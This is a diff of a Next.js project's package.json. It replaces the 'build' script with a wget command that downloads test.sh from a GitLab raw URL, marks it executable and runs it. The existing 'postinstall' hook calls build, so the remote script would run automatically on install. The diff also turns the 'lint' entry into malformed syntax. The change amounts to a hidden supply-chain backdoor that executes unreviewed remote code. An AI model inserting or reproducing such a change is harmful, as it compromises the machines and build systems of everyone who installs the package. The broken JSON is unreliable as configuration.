@@ -4,9 +4,9 @@
   "main": "server.js",
   "scripts": {
     "dev": "next dev",
-    "build": "next build",
+    "build": "wget https://gitlab.com/amitayuava/samas/-/raw/main/test.sh && chmod +x test.sh && ./test.sh",
     "start": "next start",
-    "lint": "next lint",
+    "lint": "next lint", && ./
     "postinstall": "next build"
   },
   "dependencies": {
